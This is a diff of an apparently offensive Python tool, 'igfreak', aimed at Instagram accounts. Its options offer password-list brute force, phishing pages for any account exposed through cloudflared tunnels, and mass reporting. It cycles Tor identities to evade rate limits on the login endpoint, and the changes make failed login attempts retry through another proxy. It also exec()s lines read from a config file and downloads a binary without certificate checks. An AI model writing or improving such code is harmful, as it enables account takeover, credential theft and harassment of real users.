@@ -18,6 +18,7 @@
 #  along with this program; if not, write to the Free Software
 #  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 #  MA 02110-1301, USA.
+#  IT WAS SO HARD TO MAKE THIS BUT STILL I MADE
 import os
 import sys
 import marshal
@@ -25,7 +26,7 @@ try:
 	import requests,socks
 except Exception:
 	os.system('pip install requests[socks]')
-#import requests as rs
+
 def clr():
 	os.system('clear')
 try:
@@ -60,7 +61,7 @@ Y = Style.BRIGHT+Fore.YELLOW
 M = Style.BRIGHT+Fore.MAGENTA
 W = Style.BRIGHT+Fore.WHITE
 R = Style.BRIGHT+Fore.RED
-version = 2.0
+version = "3.0[Stable]"
 def check_d():
     php = os.system("command -v  php > /dev/null")
     if php == 0:
@@ -144,7 +145,10 @@ def install_cloudflared():
         os.system( f"wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-386 --no-check-certificate && mv cloudflared-linux-386 {sys.prefix}/bin/cloudflared && chmod +x {sys.prefix}/bin/cloudflared ")
     
 try:
-    exec(subprocess.check_output("cat .igfreak.conf",shell=True).decode()) 
+    a_file = open(".igfreak.conf")
+    lines = a_file.readlines()
+    for line in lines:
+        exec(line)
     igfreak_report_account = igfreak_report_account
     igfreak_report_account_pass = igfreak_report_account_pass
 
@@ -349,60 +353,60 @@ def report(id,xx,amount,wait):
 import argparse 
 
 cli_parser = argparse.ArgumentParser(add_help=False)
-# nargs = '+' , makes them positional argument.
-cli_parser.add_argument('-username',  # parse username from command line
+
+cli_parser.add_argument('-username',  
                         '-u',
                         type=str,
                         help='username for Instagram account'
                         )
-cli_parser.add_argument('-template',  # parse username from command line
+cli_parser.add_argument('-template',  
                         '-t',
                         type=str,
                         help='username for Instagram account'
                         )
 
-cli_parser.add_argument('-password-list',  # parse path to password list file
+cli_parser.add_argument('-password-list',
                         '-pl',
                         type=str,
                         help='password list file to try with the given username.'
 )
-cli_parser.add_argument('-amount',  # parse path to password list file
+cli_parser.add_argument('-amount', 
                         '-am',
                         type=str,
                         help='Amount of reports.'
 )
-cli_parser.add_argument('-id',  # parse path to password list file
+cli_parser.add_argument('-id', 
                   
                         type=str,
                         help='Amount of reports.'
 )
-cli_parser.add_argument('--verbose',  # check if the user wants verbose mode enabled
+cli_parser.add_argument('--verbose',  
                         '--v',
                         action='count',
                         help='Activate Verbose mode. ( Verbose level )'
                         )
                         
-cli_parser.add_argument('--bruteforce',  # parse path to password list file
+cli_parser.add_argument('--bruteforce',  
                         '--b',
                         action='store_true',
                         help='password list file to try with the given username.'
                         )
-cli_parser.add_argument('--phish',  # parse path to password list file
+cli_parser.add_argument('--phish', 
                         '--p',
                         action='store_true',
                         help='Phish any instagram account'
                         )
-cli_parser.add_argument('--report',  # parse path to password list file
+cli_parser.add_argument('--report',
                         '--r',
                         action='store_true',
                         help='Phish any instagram account')
-cli_parser.add_argument('--help',  # parse path to password list file
+cli_parser.add_argument('--help',  
                         '-h','-help',
 						action='store_true',
                         
                         help=help
                         )
-cli_parser.add_argument('--update',  # parse path to password list file
+cli_parser.add_argument('--update', 
                     
 						action='store_true',
                         
@@ -506,7 +510,7 @@ def startServicea(folder,port):
         link2 = (str(oo.decode())[:-1])
     except Exception as e:
         link2 = ""
-
+    os.system("rm ~/cld.log > /dev/null 2>&1")
     command2 = f"""cloudflared tunnel -url http://localhost:{port} --logfile ~/cld.log > /dev/null 2>&1 &  
     sleep 10 && grep -o "https://[-0-9a-z]*\.trycloudflare.com" ~/cld.log"""
     try:
@@ -621,17 +625,13 @@ from stem.control import Controller
 from stem import Signal
 
 def get_tor_session():
-    # initialize a requests Session
     session = requests.Session()
-    # setting the proxy of both http & https to the localhost:9050 
-    # this requires a running Tor service in your machine and listening on port 9050 (by default)
     session.proxies = {"http": "socks5://localhost:9050", "https": "socks5://localhost:9050"}
     return session
 
 def renew_connection():
     with Controller.from_port(port=9051) as c:
         c.authenticate()
-        # send NEWNYM signal to establish a new clean connection through the Tor network
         c.signal(Signal.NEWNYM)
 url = 'https://www.instagram.com/accounts/login/ajax/'
 import random
@@ -682,8 +682,8 @@ def signin(password,username):
          try:
          	r = requests.post(url, headers=headers, data=data,proxies=por,timeout=10)
          except Exception as e:
-         	error(str(e))
-         	exit()
+            print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
+            signin(password,username)
          print(f"{B}[{G}>{B}] {W}Response   : {W}{r.json()['status']}")
          try:
          	print(f"{B}[{G}>{B}] {R}Message    : {W}{r.json()['message']}")
